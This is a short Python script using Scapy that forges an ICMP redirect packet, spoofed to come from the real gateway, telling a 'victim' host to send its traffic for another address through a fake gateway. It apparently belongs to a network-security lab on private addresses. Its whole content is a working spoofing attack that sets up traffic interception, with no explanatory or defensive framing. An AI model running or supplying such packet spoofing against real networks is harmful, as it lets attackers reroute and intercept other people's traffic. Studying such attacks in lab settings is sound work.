#!/usr/bin/python3
from scapy.all import *
from scapy.layers.inet import ICMP, IP
real_gateway ='10.9.0.11'
victim = '10.9.0.5'
fake_gw = '10.9.0.111'
# Create outer IP header
ip = IP(src=real_gateway, dst=victim)

# Correct ICMP message with type 5 (Redirect) and code 1 (Redirect for host)
icmp = ICMP(type=5, code=1)  # Fixed: use integers here, not strings
icmp.gw = fake_gw  # Gateway address the victim should use

# The enclosed IP packet (original packet the victim is sending)
ip2 = IP(src='10.9.0.5', dst='192.168.60.5')  # Original packet (victim's traffic)

# Send the crafted packet
send(ip/icmp/ip2/ICMP())
